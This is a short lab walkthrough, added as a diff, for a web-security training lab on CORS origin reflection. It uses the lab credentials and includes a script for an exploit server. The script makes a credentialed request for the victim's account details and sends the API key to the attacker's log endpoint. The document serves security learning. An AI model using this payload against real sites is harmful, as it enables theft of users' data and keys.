@@ -1,0 +1,26 @@
+1. open the lab on your burpsuite browser, login using the details wiener:peter
+2. go to http history in proxy tabs, and look for a request sent to /accountDetails
+3. here is the request:
+![HTTP history](/web-security/cors/images/lab1.png)
+4. Next, we send the request to repeater and set the Origin to https://example.com to check if it is reflected in the response. 
+![Origin reflection](/web-security/cors/images/lab1-request.png)
+5. We can see that it is being reflected, now, we head over to exploit server and paste this code:
+
+```
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://LAB-ID.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+</script>
+```
+
+6. We have to replace LAB-ID with our unique lab id.
+7. Send the exploit to the victim and go to access logs to retrieve the api key. 
+8. the api key is url encoded, decode it and submit the solution.
+
